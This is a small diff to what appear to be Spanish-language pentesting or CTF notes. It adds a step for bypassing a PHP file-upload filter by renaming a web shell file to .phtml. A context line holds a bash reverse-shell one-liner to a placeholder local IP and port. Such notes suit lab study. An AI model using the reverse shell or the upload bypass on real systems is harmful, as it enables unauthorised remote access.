@@ -48,7 +48,11 @@ bash -c "sh -i >&  /dev/tcp/{ip maquina local}/{nuevopuerto} 0>&1"
 cuando intentas subir un archivo en .php por ejemplo y no está permitido tenemos que Bypassear la restricción.
 
 Intentamnos subir un fichero con extension .phtml
+seria el mismo que en php pero cambiando directamente con un 
 
+```sh fold:"Cambiar la extension de un fichero"
+mv pwned.php pwned.phtml
+```
 
 
 
